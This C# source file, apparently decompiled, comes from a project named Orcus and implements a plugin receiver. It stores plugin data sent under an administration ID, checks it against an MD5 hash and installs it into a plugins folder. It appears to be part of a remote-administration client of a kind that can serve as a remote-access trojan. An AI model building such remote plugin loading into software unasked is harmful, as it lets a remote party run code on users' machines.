using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using Orcus.Config;
using Orcus.Shared.Utilities;

namespace Orcus.Connection;

public class PluginReceiver
{
	private readonly byte[] _md5Hash;

	private readonly string _tempPath;

	public Guid Guid { get; }

	public ushort AdministrationId { get; }

	public string Version { get; }

	public FileStream FileStream { get; }

	public PluginReceiver(ushort administrationId, Guid guid, byte[] md5Hash, string version)
	{
		AdministrationId = administrationId;
		Guid = guid;
		_md5Hash = md5Hash;
		Version = version;
		_tempPath = FileExtensions.GetFreeTempFileName();
		FileStream = new FileStream(_tempPath, FileMode.CreateNew, FileAccess.ReadWrite);
	}

	public bool ImportPlugin()
	{
		try
		{
			FileStream.Position = 0L;
			byte[] first;
			using (MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider())
			{
				first = mD5CryptoServiceProvider.ComputeHash(FileStream);
			}
			if (!first.SequenceEqual(_md5Hash))
			{
				return false;
			}
			FileInfo fileInfo = new FileInfo(Path.Combine(Consts.PluginsDirectory, $"{Guid:N}_{Version}"));
			DirectoryInfo? directory = fileInfo.Directory;
			if (directory != null && !directory!.Exists)
			{
				fileInfo.Directory!.Create();
			}
			long length = FileStream.Length;
			FileStream.Close();
			if (fileInfo.Exists)
			{
				if (fileInfo.Length == length)
				{
					byte[] first2;
					using (MD5CryptoServiceProvider mD5CryptoServiceProvider2 = new MD5CryptoServiceProvider())
					{
						using FileStream inputStream = fileInfo.OpenRead();
						first2 = mD5CryptoServiceProvider2.ComputeHash(inputStream);
					}
					if (first2.SequenceEqual(_md5Hash))
					{
						return true;
					}
				}
				try
				{
					fileInfo.Delete();
				}
				catch (Exception)
				{
					return false;
				}
			}
			File.Move(_tempPath, fileInfo.FullName);
		}
		finally
		{
			FileStream.Close();
			if (File.Exists(_tempPath))
			{
				File.Delete(_tempPath);
			}
		}
		return true;
	}
}
